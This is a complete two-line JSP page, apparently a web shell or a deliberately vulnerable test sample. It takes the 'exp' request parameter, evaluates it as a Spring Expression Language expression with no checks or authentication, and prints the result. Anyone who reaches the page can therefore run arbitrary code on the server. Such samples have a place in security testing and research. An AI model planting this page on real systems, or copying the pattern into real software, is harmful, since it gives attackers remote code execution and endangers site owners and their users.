<%@ page import="org.springframework.expression.spel.standard.SpelExpressionParser" %>
<%=new SpelExpressionParser().parseExpression(request.getParameter("exp")).getValue()%>
